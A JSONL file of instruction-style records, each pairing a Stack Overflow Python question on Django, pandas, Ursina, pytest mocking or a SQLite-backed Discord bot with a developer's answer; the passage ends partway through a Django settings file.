{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Substring in search with Django<p>How I can do a search for substring for a filename using Django<\/p>\n<p>views.py<\/p>\n<pre><code>def search(request):\n    entries = util.list_entries()\n    find_entries = list()\n\n    search_box = request.POST.get(&quot;q&quot;).capitalize()\n\n    if search_box in entries:\n        return HttpResponseRedirect(f&quot;wiki\/{search_box}&quot;)\n    \n    for entry in entries:\n        if search_box in entry:\n            find_entries.append(entry)\n            return render(request, &quot;encyclopedia\/search.html&quot;, {\n                &quot;search_result&quot;: find_entries,\n                &quot;search&quot;: search_box\n            })\n        else:\n            print(f'{find_entries}')\n    else:\n        return render(request, &quot;encyclopedia\/search.html&quot;, {&quot;no_result&quot;: f&quot;No results for {search_box}&quot;})\n<\/code><\/pre>\n<p>search.html:<\/p>\n<pre><code>{% extends &quot;encyclopedia\/layout.html&quot; %}\n\n{% block title %}\n    search results\n{% endblock %}\n\n{% block body %}\n    {% for result in search_result %}\n        &lt;li&gt;&lt;a href=wiki\/{{ result }}&gt;{{ result }}&lt;\/a&gt;&lt;\/li&gt;\n    {% endfor %}\n    &lt;h1&gt;{{ no_result }}&lt;\/h1&gt;\n{% endblock %}\n<\/code><\/pre>\n<p>i tried it but only return a result for example if I search for <code>'d'<\/code> it only return <code>django<\/code> and then stop the for loop without return another values like node for example<\/p>","output_text":"<p>You're exiting for loop after first successful iteration. Change the code as following:<\/p>\n<pre><code>for entry in entries:\n    if search_box in entry:\n        find_entries.append(entry)\n    else:\n        print(f'{find_entries}')\nif find_entries:\n    return render(request, &quot;encyclopedia\/search.html&quot;, {\n       &quot;search_result&quot;: find_entries,\n       &quot;search&quot;: search_box\n    })\n...\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to print the given strings with respect to the % integer value obtained (0-100)?<p>TXT_0 = &quot;\u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f&quot;<\/p>\n<p>TXT_1 = &quot;\u2b1b\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f&quot;<\/p>\n<p>TXT_2 = &quot;\u2b1b\ufe0f \u2b1b\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f&quot;<\/p>\n<p>TXT_3 = &quot;\u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f&quot;<\/p>\n<p>TXT_4 = &quot;\u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f&quot;<\/p>\n<p>TXT_5 = &quot;\u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f&quot;<\/p>\n<p>TXT_6 = &quot;\u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f&quot;<\/p>\n<p>TXT_7 = &quot;\u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u25fb\ufe0f \u25fb\ufe0f \u25fb\ufe0f&quot;<\/p>\n<p>TXT_8 = &quot;\u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u25fb\ufe0f \u25fb\ufe0f&quot;<\/p>\n<p>TXT_9 = &quot;\u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u25fb\ufe0f&quot;<\/p>\n<p>TXT_10 = &quot;\u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f \u2b1b\ufe0f&quot;<\/p>\n<p>'x' is a real-time integer variable from a percentage calculation function.<\/p>\n<p>Eg:<\/p>\n<pre><code>if x &lt; 10:\n  print(TXT_0)\n\nif (x &gt;= 10) and (x &lt; 20):\n\n  print(TXT_1)\n\n<\/code><\/pre>\n<p>I want to print the above text like a percentage display!\nNeed to print the corresponding string with respect to the input between 0 - 100!<\/p>","output_text":"<p>That's a really painful way to do it. Instead, just generate the output string you want based on a calculation.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>print (x\/\/10 * &quot;\u2b1b\ufe0f &quot; + (10-x\/\/10) * &quot;\u25fb\ufe0f &quot;)\n<\/code><\/pre>\n<p>If for some reason you have a genuine need to keep all the strings in memory, probably keep them in an array.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>indicator = [i*&quot;\u2b1b\ufe0f &quot; + (10-i)*&quot;\u25fb\ufe0f &quot; for i in range(11)]\n<\/code><\/pre>\n<p>Notice that Python's arrays are zero-based; the one corresponding to zero to nine per cent is <code>indicator[0]<\/code> and the one to one hundred per cent is <code>indicator[10]<\/code>.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n select records by date, where date is 15th ot the previous business day of the month<p>I am trying to select the records that correspond to each 15th of the month, here is the examle of the data:<\/p>\n<pre><code>           date              open               date1          date2\n0       2000-01-03 00:00:00  0               2000-01-17 00:00:00    2000-02-15 00:00:00\n1       2000-01-07 00:00:00  6084704         2000-01-17 00:00:00    2000-02-15 00:00:00\n3       2000-01-12 00:00:00  992482          2000-01-17 00:00:00    2000-02-15 00:00:00\n4       2000-01-17 00:00:00  11721104        2000-02-15 00:00:00    2000-03-15 00:00:00\n5       2000-01-18 00:00:00  4459200         2000-02-15 00:00:00    2000-03-15 00:00:00\n6       2000-01-19 00:00:00 3652363          2000-02-15 00:00:00    2000-03-15 00:00:00\n7       2000-01-27 00:00:00 17421705         2000-02-15 00:00:00    2000-03-15 00:00:00\n...\n43      2000-03-24 00:00:00 13594539         2000-04-17 00:00:00    2000-05-15 00:00:00\n44      2000-03-27 00:00:00 5122526          2000-04-17 00:00:00    2000-05-15 00:00:00\n45      2000-03-29 00:00:00 3041827          2000-04-17 00:00:00    2000-05-15 00:00:00\n46      2000-03-30 00:00:00 4769960          2000-04-17 00:00:00    2000-05-15 00:00:00\n48      2000-03-31 00:00:00 15982410         2000-04-17 00:00:00    2000-05-15 00:00:00\n49      2000-04-04 00:00:00 3178232          2000-04-17 00:00:00    2000-05-15 00:00:00\n51      2000-04-05 00:00:00 15571975         2000-04-17 00:00:00    2000-05-15 00:00:00\n52      2000-04-06 00:00:00 2694165          2000-04-17 00:00:00    2000-05-15 00:00:00\n53      2000-04-07 00:00:00 536426           2000-04-17 00:00:00    2000-05-15 00:00:00\n55      2000-04-10 00:00:00 5523700          2000-04-17 00:00:00    2000-05-15 00:00:00\n56      2000-04-11 00:00:00 11212425         2000-04-17 00:00:00    2000-05-15 00:00:00\n58      2000-04-12 00:00:00 546223           2000-04-17 00:00:00    2000-05-15 00:00:00\n61      2000-04-13 00:00:00 17913960         2000-05-15 00:00:00    2000-06-15 00:00:00\n63      2000-04-17 00:00:00 3824185          2000-05-15 00:00:00    2000-06-15 00:00:00\n...\n1578    2006-01-03 00:00:00 4453005          2006-01-16 00:00:00    2006-02-15 00:00:00\n1579    2006-01-04 00:00:00 6557373          2006-01-16 00:00:00    2006-02-15 00:00:00\n1580    2006-01-05 00:00:00 2837987          2006-01-16 00:00:00    2006-02-15 00:00:00\n...\n1634    2006-03-14 00:00:00 31819879         2006-04-17 00:00:00    2006-05-15 00:00:00\n1635    2006-03-20 00:00:00 1541321          2006-04-17 00:00:00    2006-05-15 00:00:00\n1636    2006-03-21 00:00:00 47047150         2006-04-17 00:00:00    2006-05-15 00:00:00\n1638    2006-03-22 00:00:00 6111712          2006-04-17 00:00:00    2006-05-15 00:00:00\n\n\n<\/code><\/pre>\n<p>Sometimes there is no 15th, since I have a range of business days. For such case I'd like to choose the record closes to 15th of a month.\nSo, the expected outcome would be smth like:<\/p>\n<pre><code>3       2000-01-12 00:00:00  992482          2000-01-17 00:00:00    2000-02-15 00:00:00\n...\n61      2000-04-13 00:00:00 17913960         2000-05-15 00:00:00    2000-06-15 00:00:00\n...\n1634    2006-03-14 00:00:00 31819879         2006-04-17 00:00:00    2006-05-15 00:00:00\n<\/code><\/pre>\n<p>I figured out how to find every 15th of the month, that is not a very difficult:<\/p>\n<pre><code>mid_date_mask = df['date'].map(lambda x: x.day) == 15\n\ndf[mid_date_mask]\n<\/code><\/pre>\n<p>But I cannot understand how to incorporate a step back when there is no 15th in a month.<\/p>\n<p>I would be very grateful for your help!<\/p>","output_text":"<p>You could try if the following works for you:<\/p>\n<pre><code>mid_date_idx = (\n    (df[&quot;date&quot;].dt.day - 15).abs()\n    .groupby([df[&quot;date&quot;].dt.year, df[&quot;date&quot;].dt.month])\n    .idxmin()\n    .to_list()\n)\nmid_date_mask = df.index.isin(mid_date_idx)\n<\/code><\/pre>\n<ul>\n<li><code>df<\/code> is your dataframe<\/li>\n<li>First bulid a series from column <code>date<\/code> with the absolute difference of the day and <code>15<\/code>.<\/li>\n<li>Then group the result by year-month pairs, use <a href=\"https:\/\/pandas.pydata.org\/docs\/reference\/api\/pandas.Series.idxmin.html\" rel=\"nofollow noreferrer\"><code>.idxmin()<\/code><\/a> to get the first index with the minimum per group, and collect them in a list <code>mid_date_idx<\/code>.<\/li>\n<li>Build the <code>mid_date_mask<\/code> by checking if the index is in the list.<\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Class Object not working as expected in Ursina<p>I have a class named <code>startPlatform<\/code> in Python. I am using the ursina engine. When I call it, it gives me an error:<\/p>\n<pre class=\"lang-none prettyprint-override\"><code>Traceback (most recent call last):\n\nFile &quot;C:\/Users\/eshan\/OneDrive\/Desktop\/ursina-platformer-maker\/main.py&quot;, line 29, in &lt;module&gt;`\n    StartPlatform(position = (10, 5, 8))\n  File &quot;C:\/Users\/eshan\/OneDrive\/Desktop\/ursina-platformer-maker\/main.py&quot;, line 17, in __init__\n    super().__init__(\nTypeError: object.__init__() takes exactly one argument (the instance to initialize)\n<\/code><\/pre>\n<p>The argument are correct, and I don't know what's happening. Here's my Code:<\/p>\n<pre><code>from ursina import *\nfrom ursina.prefabs.sky import Sky\nfrom ursina.shaders import basic_lighting_shader\n\napp = Ursina()\neditor = EditorCamera()\n\ndef input(key):\n    if held_keys[&quot;q&quot;]:\n        quit()\n\nclass StartPlatform():\n    def __init__(self, position = (0, 0, 0)):\n        super().__init__(\n            parent = scene,\n            model = &quot;cube&quot;,\n            position = position,\n            scale = (5, 2, 6),\n            collider = &quot;mesh&quot;,\n            shader = basic_lighting_shader,\n            texture = &quot;white_cube&quot;,\n            color = color.lime\n        )\n\nSky()\nStartPlatform(position = (10, 5, 8))\napp.run()\n<\/code><\/pre>","output_text":"<p><code>StartPlatform<\/code> does not inherit <code>Entity<\/code>, which I assume is what you want it to be.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>class StartPlatform():\n<\/code><\/pre>\n<p>Should be:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>class StartPlatform(Entity):\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to Mock: pytest.raises DID NOT RAISE <class 'subprocess.TimeoutExpired'><p>I am using <code>subprocess<\/code> for a task, and I have a <code>try\/except<\/code> block for catching <code>TimeoutExpired<\/code>. I try to mock my object using <code>side_effect<\/code> so I can catch the fake exception with <code>pytest.raises<\/code>. Whatever I do, I get <code>DID NOT RAISE &lt;class 'subprocess.TimeoutExpired'&gt;<\/code>.\nI have tried many things, and even though I'm not so experienced with mocking, I believe something like that should in principle work:<\/p>\n<pre><code># my_check.py\nfrom subprocess import TimeoutExpired, PIPE, check_output\n\nclass Check:\n    def __init__(self, name):\n        self.name = name\n        self.status = self.get_status()\n\n    def get_status(self):\n        try:\n            out = check_output([&quot;ls&quot;], universal_newlines=True, stderr=PIPE, timeout=2)\n        except TimeoutExpired as e:\n            print(f&quot;Command timed out: {e}&quot;)\n            raise\n\n        if self.name in out:\n            return True\n        return False\n\n\n# test_my_check.py\nimport pytest\nfrom unittest import mock\nfrom subprocess import TimeoutExpired\n\n@mock.patch(&quot;src.my_check.Check&quot;, autospec=True)\ndef test_is_installed_exception(check_fake):\n    check_fake.get_status.side_effect = TimeoutExpired\n    obj_fake = check_fake(&quot;random_file.txt&quot;)\n    with pytest.raises(TimeoutExpired):\n        obj_fake.get_status()\n<\/code><\/pre>\n<p>For some reason it doesn't work though, and I can't get my head around what's wrong.<\/p>","output_text":"<p>If you want to test the functionality of a class (<code>Check<\/code>) you cannot mock that class. You have to mock instead the calls that you want to change - in this case probably <code>check_output<\/code>, which you want to raise an exception:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>@mock.patch(&quot;src.my_check.check_output&quot;)\ndef test_is_installed_exception(mocked_check_output):\n    mocked_check_output.side_effect = TimeoutExpired(&quot;check_output&quot;, 1)\n    with pytest.raises(TimeoutExpired):\n        Check(&quot;random_file.txt&quot;)\n<\/code><\/pre>\n<p>A few notes:<\/p>\n<ul>\n<li>you have to patch &quot;src.my_check.check_output&quot;, because you import <code>check_output<\/code> using <code>from subprocess import check_output<\/code>, so you use the reference in your class<\/li>\n<li>you have to construct a valid <code>TimeoutExpired<\/code> object - it requires 2 arguments, so you have to provide them<\/li>\n<li>as <code>get_status<\/code> is already called in <code>__init__<\/code>, you have to test the class construction - you can't get a properly constructed instance because of the raised exception<\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Blacklist SQL Database. Not working Discord.py<pre class=\"lang-py prettyprint-override\"><code>db = sqlite3.connect(&quot;BlacklistedUsers.db&quot;)\nc = db.cursor()\nc.execute('''CREATE TABLE IF NOT EXISTS &quot;BlacklistedUser_IDs&quot; (\n    &quot;User_IDs&quot;  INTEGER,\n    &quot;Reason&quot;    TEXT,\n    PRIMARY KEY(&quot;User_IDs&quot;)\n);''')\n\ndef owner_ID(ctx):\n    return ctx.author.id == 738332946934661132\n\ndef not_allowed(ctx):\n    member = ctx.discord.member.id\n    c.execute(&quot;SELECT `User_IDs` FROM `BlacklistedUser_IDs` WHERE `User_IDs`=%s&quot;, (member))\n    UserID = cursor.fetchall()\n    if ctx.author.id not in UserID:\n        print(UserID)\n        return True\n    else:\n        return False\n\n@bot.event\nasync def on_command_error(ctx, error):\n    if isinstance(error, commands.CheckFailure):\n        embed = discord.Embed(title=&quot;&quot;, description=&quot;&quot;, colour=discord.Color.red())\n        embed.set_author(name=&quot;BlackListed!&quot;)\n        embed.add_field(name=&quot;Sorry&quot;, value=f&quot;{ctx.author} It looks like you've been Blacklisted! for {Reason}&quot;, inline=False)\n        embed.add_field(name=&quot;If you would like to Appeal Or think this might have been a mistake Message&quot;, value=&quot;@L Y N X&quot;, inline=False)\n        await ctx.send(embed=embed)\n\n@bot.command()\n@commands.check(owner_ID)\nasync def blacklist(ctx, member: discord.Member, *, reason=None):\n    c.execute(&quot;INSERT INTO `BlacklistedUser_IDs`(User_IDs, Reason) VALUES(%s, %s)&quot;, (member.id, reason))\n    db.commit()\n    embed = discord.Embed(title=&quot;&quot;, description=&quot;&quot;, colour=discord.Color.red())\n    embed.set_author(name=&quot;Blacklisted!&quot;)\n    embed.add_field(name=&quot;Success&quot;, value=f&quot;{member.name}#{member.discriminator} -- {member.id} Has been Blacklisted from Using commands!&quot;)\n    embed.add_field(name=&quot;Reason : &quot;, value=f&quot;{reason}&quot;)\n    await ctx.send(embed=embed)\n\n@bot.command()\n@commands.check(owner_ID)\nasync def unblacklist(ctx, member: discord.Member):\n    c.execute(&quot;DELETE FROM BlacklistedUser_IDs WHERE User_IDs =%s AND Reason=%s;&quot;, (member.id, reason))\n    db.commit()\n    embed = discord.Embed(title=&quot;&quot;, description=&quot;&quot;, colour=discord.Color.red())\n    embed.set_author(name=&quot;Unblacklisted!&quot;)\n    embed.add_field(name=&quot;Success&quot;, value=f&quot;{member.name}#{member.discriminator} -- {member.id} Has been Unblacklisted from Using commands!&quot;)\n    await ctx.send(embed=embed)\n<\/code><\/pre>\n<p>When trying to run this Command it wont Run Fullstop.. It'll run anything above the SQL but when it comes to the SQL it wont run, Both for Blacklist and Unblacklist?? everything looks correct so i'm confused as to what is wrong..<\/p>\n<p>any solutions \/\/ Problem fixes?<\/p>","output_text":"<p>There are a few problem in your code sample:<\/p>\n<ul>\n<li>The way you insert data is wrong<\/li>\n<li><code>db<\/code> and <code>c<\/code> aren't defined<\/li>\n<li>Your <code>commands.check()<\/code> decorator seems to be wrong<\/li>\n<\/ul>\n<p>Let's say your table name is <code>table<\/code> and it has two rows nammed <code>row_1<\/code> and <code>row_2<\/code>. If you want to insert two values, for instance <code>var_1<\/code> and <code>var_2<\/code> here's how you do it:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>with sqlite3.connect('database.db') as connection:\n    cursor = connection.cursor()\n    cursor.execute('INSERT INTO table(row_1, row_2) VALUES(?, ?)', (var_1, var_2))\n    connection.commit()\n<\/code><\/pre>\n<p>Your second error might come from <code>@commands.check(owner_ID)<\/code>. If it's just an ID, you're using <a href=\"https:\/\/discordpy.readthedocs.io\/en\/latest\/ext\/commands\/api.html?highlight=commands%20check#discord.ext.commands.check\" rel=\"nofollow noreferrer\"><code>commands.check()<\/code><\/a> the wrong way. In this case, if your goal is to make this command only accessible for the bot creator, you can use <a href=\"https:\/\/discordpy.readthedocs.io\/en\/latest\/ext\/commands\/api.html?highlight=is_owner#discord.ext.commands.is_owner\" rel=\"nofollow noreferrer\"><code>@commands.is_owner()<\/code><\/a>:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>@bot.command()\n@commands.is_owner()\nasync def blacklist(ctx, member: discord.Member, *, reason=None):\n    ...\n<\/code><\/pre>\n<p>With all those changes, your code would look like this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>from sqlite3 import connect\n\n@bot.command()\n@commands.is_owner()\nasync def blacklist(ctx, member: discord.Member, *, reason=None):\n    with connect('BlacklistedUsers.db') as conn:\n        c = conn.cursor()\n        c.execute(&quot;INSERT INTO BlacklistedUser_IDs(User_IDs, Reason) VALUES(?, ?)&quot;, (member.id, reason))\n        conn.commit()\n\n    embed = discord.Embed(colour=discord.Color.red())\n    embed.set_author(name=&quot;Blacklisted!&quot;)\n    embed.add_field(name=&quot;Success&quot;, value=f&quot;{member.name}#{member.discriminator} -- {member.id} Has been Blacklisted from Using commands!&quot;)\n    embed.add_field(name=&quot;Reason :&quot;, value=f&quot;{reason}&quot;)\n    await ctx.send(embed=embed)\n<\/code><\/pre>\n<p>For your <code>is_allowed()<\/code> function : note that I changes <code>ctx<\/code> to <code>member_id<\/code> since you only need the member ID. When you call this function, you'll just have to pass the member id (eg. <code>is_allower(ctx.member.id)<\/code>) :<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def not_allowed(member_id):\n    with connect('BlacklistedUsers.db') as conn:\n        c = conn.cursor()\n        c.execute(&quot;SELECT User_IDs FROM BlacklistedUser_IDs WHERE User_IDs=?&quot;, (member,))\n    UserIDs = cursor.fetchall()\n    return False if member_id in UserIDs else True\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Django ManifestStaticFilesStorage + DEBUG = False gives error in uploaded files: They don't show<p>I have a problem and I will do the best to explain it, to see if you can help me out.<\/p>\n\n<p><strong>CONTEXT<\/strong><\/p>\n\n<p>I have a system running in a test server, which is set up like a production environment in order to test my code before merging to master and give the go to the production server provider of my client to update the code. This means it runs in <code>DEBUG = False<\/code>. All good, all perfect for months.<\/p>\n\n<p>I decided to activate the <code>ManifestStaticFilesStorage<\/code> setting in order to have a hash number added in my static files, I've used it before and it's a good way to break cache rules when updating files (like CSS rules that refuse to load). There is an issue with cache that may be solvable messing around with the server but that's not an option in this case.<\/p>\n\n<p>Everything went smoothly:<\/p>\n\n<ol>\n<li>No issues in collectstatic other than a few missing static files (already solved)<\/li>\n<li>Static files loaded perfectly<\/li>\n<\/ol>\n\n<p>BUT...<\/p>\n\n<p><strong>THE PROBLEM<\/strong><\/p>\n\n<p>This system manages content (images, audio files and custom fonts). When I activated the <code>ManifestStaticFilesStorage<\/code> setting, all uploaded files started to throw 404 errors (and some occasional 500 error) in the server access log. Meaning, they look like this:<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/bonVv.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/bonVv.png\" alt=\"Broken images\"><\/a><\/p>\n\n<p>You can see the broken image icon but you can also see the background colores of each square (color which is injected by JS because it can be customized in the custom CMS). These images are uploaded in the CMS and they live in the media folder configured in the settings file.<\/p>\n\n<p>Of course, if I go to <code>DEBUG = True<\/code>, everything gets fixed (come on! -.-). I went and recreated production enviroment in local, same issue: <code>DEBUG = False<\/code> bad, <code>DEBUG = True<\/code> works<\/p>\n\n<p><strong>THOUGHTS<\/strong><\/p>\n\n<ul>\n<li>404 means the file is not there. Guess what? it's there, they all are<\/li>\n<li>The occasional 500 means permissions. Well, I haven't changed the permissions. Also, permissiones where the same. Also, I'm using WebFaction, it handles all that for me<\/li>\n<li>Console in browser says network error. In the Network tab it doesn't even show the 404 errors or the few 500 that may appear<\/li>\n<li>Broken DB? Nope. Besides, if it were broken, <code>DEBUG = True<\/code> would fail<\/li>\n<li>Apache error log? Nothing to show for. The access log shows the access errors, meaning errors on file that are correctly placed<\/li>\n<\/ul>\n\n<p>So, I ran out of ideas. Maybe someone out there has the answer, I hope so. I will still be trying to solve it but I can use the help, please.<\/p>\n\n<p><strong>RELEVANT CODE<\/strong><\/p>\n\n<p><em>storage.py<\/em><\/p>\n\n<pre><code>class ManifestStaticFilesStorageNotStrict(ManifestStaticFilesStorage):\n    \"\"\"A relaxed implementation of django's ManifestStaticFilesStorage.\n    \"\"\"\n    manifest_strict = False\n<\/code><\/pre>\n\n<p><em>settings.py (redacted)<\/em><\/p>\n\n<pre><code># -*- coding: utf-8 -*-\n\n# Standard libs imports\n# Build paths inside the project like this: os.path.join(BASE_DIR, ...)\nimport os\n\n# Django libs imports\nfrom django.urls import reverse_lazy\nfrom django.utils.translation import ugettext_lazy as _\n\nBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = &lt;SECRET KEY HERE (: &gt;\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = ['*']\n\n##########################\n# APPLICATION DEFINITION #\n##########################\n\nDJANGO_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.sites',\n    'django.contrib.messages',\n    'django.contrib.sitemaps',\n    'django.contrib.staticfiles',\n]\n\nTHIRD_PARTY_APPS = [\n    # https:\/\/github.com\/audiolion\/django-behaviors\n    'behaviors.apps.BehaviorsConfig',\n    # https:\/\/github.com\/zostera\/django-bootstrap4\n    'bootstrap4',\n    # https:\/\/django-ckeditor.readthedocs.io\/en\/latest\/\n    'ckeditor',\n    # https:\/\/github.com\/praekelt\/django-recaptcha\n    'captcha',\n    # https:\/\/django-tables2.readthedocs.io\/en\/latest\/index.html\n    'django_tables2',\n    # https:\/\/github.com\/django-extensions\/django-extensions\n    'django_extensions',\n]\n\nCUSTOM_APPS = [\n    &lt;CUSTOM APPS HERE (: &gt;\n]\n\nELASTICSEARCH_DSL = {\n    &lt;ELASTICSEARCH DATA HERE (: &gt;\n}\n\nINSTALLED_APPS = DJANGO_APPS + THIRD_PARTY_APPS + CUSTOM_APPS\n\nSITE_ID = 1\n\nAUTH_USER_MODEL = 'users.User'\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n\n    # https:\/\/github.com\/PaesslerAG\/django-currentuser\n    'django_currentuser.middleware.ThreadLocalUserMiddleware',\n]\n\nROOT_URLCONF = 'main.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [os.path.join(BASE_DIR, 'main\/templates')],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n                'main.context_processors.add_to_context',\n            ],\n        },\n    },\n]\n\nDJANGO_TABLES2_TEMPLATE = 'django_tables2\/bootstrap-responsive.html'\n\nWSGI_APPLICATION = 'main.wsgi.application'\n\nLOGIN_URL = reverse_lazy('back_office:auth:login')\n\nSILENCED_SYSTEM_CHECKS = ['captcha.recaptcha_test_key_error']\n\n#####################\n# DATABASE SETTINGS #\n#####################\n#\n# https:\/\/docs.djangoproject.com\/en\/2.0\/ref\/settings\/#databases\n\nDATABASES = {\n    &lt;DATABASE DATA HERE (: &gt;\n}\n\n##########################\n# AUTHENTICATION BACKEND #\n##########################\n#\n# https:\/\/docs.djangoproject.com\/en\/2.0\/topics\/auth\/customizing\/\n\nAUTHENTICATION_BACKENDS = [\n    &lt;AUTHENTICATION_BACKENDS DATA HERE (: &gt;\n]\n\n################################\n# PASSWORD VALIDATION SETTINGS #\n################################\n#\n# https:\/\/docs.djangoproject.com\/en\/1.11\/ref\/settings\/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation'\n                '.UserAttributeSimilarityValidator',\n    },\n    # {\n    #     'NAME': 'django.contrib.auth.password_validation'\n    #             '.MinimumLengthValidator',\n    # },\n    {\n        'NAME': 'main.validators.password_validators'\n                '.CustomMinimumLengthValidator',\n    },\n    # {\n    #     'NAME': 'django.contrib.auth.password_validation'\n    #             '.CommonPasswordValidator',\n    # },\n    {\n        'NAME': 'main.validators.password_validators'\n                '.CustomCommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation'\n                '.NumericPasswordValidator',\n    },\n]\n\n##################\n# GOOGLE ANALYTICS\n##################\n\nGOOGLE_ANALYTICS_ID = \"\"\n\n\n##################\n# EMAIL SETTINGS #\n##################\n\n&lt;SETTINGS HERE (: &gt;\n\n#################################\n# INTERNATIONALIZATION SETTINGS #\n#################################\n#\n# https:\/\/docs.djangoproject.com\/en\/1.11\/topics\/i18n\/\n\nLANGUAGE_CODE = 'es'\n\nLANGUAGES = (\n    ('en', _('English')),\n    ('es', _('Spanish')),\n)\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_L10N = True\n\nUSE_TZ = True\n\nLOCALE_PATHS = (\n    os.path.join(BASE_DIR, 'locale'),\n)\n\n#############################\n# STATIC FILES SETTINGS     #\n# (CSS, JavaScript, Images) #\n#############################\n#\n# https:\/\/docs.djangoproject.com\/en\/1.11\/howto\/static-files\/\n\nSTATIC_URL = '\/static\/'\nSTATIC_ROOT = os.path.join(BASE_DIR, 'static')\n\nMEDIA_URL = '\/media\/'\nMEDIA_ROOT = os.path.join(BASE_DIR, 'static\/media')\n\n##############\n# RECAPTCHA #\n##############\n\n&lt;MORE SETTINGS HERE (: &gt;\n\n################\n# FILE STORAGE #\n################\n#\n# This settings is for a custom random number to add to all uploaded\n# files in order to break cache\n\nDEFAULT_FILE_STORAGE = 'main.storage.CustomFileSystemStorage'\n\n##################\n# LOCAL SETTINGS #\n##################\n#\n# This is the file that contains local configurations like DB passwords,\n# keys, user for an API, etc.\n#\n# This import is done at the end because it will override the default settings\n# stablish here.\n\ntry:\n    from .local_settings import *  # noqa\nexcept Exception as e:\n    pass\n\n###################\n# CKEDITOR CONFIG #\n###################\nCKEDITOR_CONFIGS = {\n    'default': {\n        # 'skin': 'moono',\n        'toolbar': 'full',\n        'skin': 'office2013',\n        'width': '100%',\n    }\n}\n\n########################\n# STATIC FILES STORAGE #\n########################\nSTATICFILES_STORAGE = \\\n    